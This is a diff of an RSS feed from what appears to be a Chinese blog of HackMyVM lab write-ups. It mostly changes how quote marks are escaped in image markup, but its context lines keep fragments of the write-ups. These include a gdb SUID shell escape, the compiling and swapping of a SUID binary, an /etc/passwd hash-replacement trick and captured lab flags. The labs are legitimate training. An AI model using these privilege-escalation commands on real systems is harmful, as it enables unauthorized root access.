-<br>这一部分配置明确禁止访问 /uploads/ 目录下的任何 PHP 文件，返回 403 Forbidden 错误。]]></description><link>https://www.c1trus.top/24-渗透/hmv/6.five.html</link><guid isPermaLink="false">24-渗透/HMV/6.Five.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.suidy]]></title><description><![CDATA[ 
+<br>这一部分配置明确禁止访问 /uploads/ 目录下的任何 PHP 文件，返回 403 Forbidden 错误。]]></description><link>https://www.c1trus.top/24-渗透/hmv/6.five.html</link><guid isPermaLink="false">24-渗透/HMV/6.Five.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/6.Five.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.suidy]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -1273,7 +1495,7 @@ int main() {
 <br>gcc  power.c -o  suidyyyyy 编译
 cp suidyyyyy /home/suidy/suidyyyyy 复制替换
 ./suidyyyyy 执行提权
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.014.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/5.suidy.html</link><guid isPermaLink="false">24-渗透/HMV/5.suidy.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[47.BlackWidow]]></title><description><![CDATA[ 
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.014.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/5.suidy.html</link><guid isPermaLink="false">24-渗透/HMV/5.suidy.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/5.suidy.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[47.BlackWidow]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -1573,7 +1795,7 @@ Follow on Twitter: 0xJin , @mindsflee
 
 0780eb289a44ba17ea499ffa6322b335
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/47.blackwidow.html</link><guid isPermaLink="false">24-渗透/HMV/47.BlackWidow.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[46.moosage]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/47.blackwidow.html</link><guid isPermaLink="false">24-渗透/HMV/47.BlackWidow.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241224124937.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[46.moosage]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -1952,7 +2174,7 @@ FLAG: Keep trying.
 
 ------------------------
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/46.moosage.html</link><guid isPermaLink="false">24-渗透/HMV/46.moosage.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[45.choc]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/46.moosage.html</link><guid isPermaLink="false">24-渗透/HMV/46.moosage.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[45.choc]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -2244,7 +2466,7 @@ gskjOtELMuhigHo7AAAACXJvb3RAY2hvYwE=
 
 <br>ssh连接那flag<br>root@choc:~# cat r00t.txt
 inesbywal
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/45.choc.html</link><guid isPermaLink="false">24-渗透/HMV/45.choc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 08:41:17 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241222142725.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241222142725.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[44. Diophante]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/45.choc.html</link><guid isPermaLink="false">24-渗透/HMV/45.choc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 08:41:17 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241222142725.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/pasted-image-20241222142725.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[44. Diophante]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -2552,7 +2774,7 @@ root.txt
 bash-5.0# cat /root/root.txt
 Culcelborlus
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/44.-diophante.html</link><guid isPermaLink="false">24-渗透/HMV/44. Diophante.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/a7u4tewdaek.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/hmv/assets/a7u4tewdaek.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[43.p4l4nc4]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/44.-diophante.html</link><guid isPermaLink="false">24-渗透/HMV/44. Diophante.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/a7u4tewdaek.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/a7u4tewdaek.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[43.p4l4nc4]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -2754,7 +2976,7 @@ root@4ng014:/home# whoami
 root
 <br>
 这里简单说一下 root用存储在/etc/passwd里面是 root:x:0:0:root:/root:/bin/bash 其中 x 是表示此用户的密码存储在 /etc/shadow 而不是 /etc/passwd 我们利用这个hash替换掉x即可，然后修改一下用户名
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/43.p4l4nc4.html</link><guid isPermaLink="false">24-渗透/HMV/43.p4l4nc4.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/u4cijtcpnh.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/hmv/assets/u4cijtcpnh.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[42.eighty]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/43.p4l4nc4.html</link><guid isPermaLink="false">24-渗透/HMV/43.p4l4nc4.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/hmv/assets/u4cijtcpnh.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/hmv/assets/u4cijtcpnh.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[42.eighty]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -3207,7 +3429,7 @@ ihavebeenherealways
 bash-5.1# cat /home/estas/user.txt
 whereihavebeen
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/41.zday.html</link><guid isPermaLink="false">24-渗透/HMV/41.Zday.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[40.orasi]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/41.zday.html</link><guid isPermaLink="false">24-渗透/HMV/41.Zday.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241219170042.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[40.orasi]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -3517,7 +3739,7 @@ import sys
 name = input(": ")
 name = bytes.fromhex(name).decode('utf-8')
 print(exec(name))
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/40.orasi.html</link><guid isPermaLink="false">24-渗透/HMV/40.orasi.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Connection]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/40.orasi.html</link><guid isPermaLink="false">24-渗透/HMV/40.orasi.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Connection]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -3580,7 +3802,7 @@ put 1.php
 /usr/bin/gpasswd
 <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.006.png" referrerpolicy="no-referrer"><br>cd /usr/bin
 ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.007.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/4.connection.html</link><guid isPermaLink="false">24-渗透/HMV/4.Connection.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[39.Hash]]></title><description><![CDATA[ 
+<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.007.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/4.connection.html</link><guid isPermaLink="false">24-渗透/HMV/4.Connection.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[39.Hash]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -3808,7 +4030,7 @@ FLAG: hashhater
 <br><br><br>maria用户的目录下面有一个myterm.sh<br>marco@hash:/home/maria$ cat myterm.sh
 export DISPLAY=:10
 xterm
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/39.hash.html</link><guid isPermaLink="false">24-渗透/HMV/39.Hash.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[38.DC04]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/39.hash.html</link><guid isPermaLink="false">24-渗透/HMV/39.Hash.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[38.DC04]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -4148,7 +4370,7 @@ soupedecode.local\administrator
 C:\users\administrator\desktop&gt;type root.txt
 1c66eabe105636d7e0b82ec1fa87cb7a
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/38.dc04.html</link><guid isPermaLink="false">24-渗透/HMV/38.DC04.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[37.emma]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/38.dc04.html</link><guid isPermaLink="false">24-渗透/HMV/38.DC04.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241218142827.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[37.emma]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. ️信息收集" data-href="#2. ️信息收集" href="https://www.c1trus.top/about:blank#2._️信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. ️信息收集</a>
@@ -4436,7 +4658,7 @@ bash -p
 itsmeimshe
 bash-5.0# cat /home/emma/user.txt
 youdontknowme
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/37.emma.html</link><guid isPermaLink="false">24-渗透/HMV/37.emma.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[36.Adroit]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/37.emma.html</link><guid isPermaLink="false">24-渗透/HMV/37.emma.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241204123101.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[36.Adroit]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -4577,7 +4799,7 @@ root.txt
 (remote) root@adroit:/home/writer#
 <br>
 我觉得这个靶场不算难。难点只是在分析java代码那里，不过我看不懂java
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/36.adroit.html</link><guid isPermaLink="false">24-渗透/HMV/36.Adroit.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[35.Soul]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/36.adroit.html</link><guid isPermaLink="false">24-渗透/HMV/36.Adroit.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203164149.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[35.Soul]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -4968,7 +5190,7 @@ uid=1002(peter) gid=1002(peter) euid=0(root) groups=1002(peter)
 root
 cat /root/rootflag.txt
 HMVohmygod
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/35.soul.html</link><guid isPermaLink="false">24-渗透/HMV/35.Soul.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 15:02:55 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[34.hacked]]></title><description><![CDATA[ 
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/35.soul.html</link><guid isPermaLink="false">24-渗透/HMV/35.Soul.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 15:02:55 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/saint.jpg"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[34.hacked]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -5154,7 +5376,7 @@ FLAG: HMVimthabesthacker
 
 ------------------------
 
-]]></description><link>https://www.c1trus.top/24-渗透/hmv/34.hacked.html</link><guid isPermaLink="false">24-渗透/HMV/34.hacked.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201183435.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[33.pickle]]></title><description><![CDATA[ 
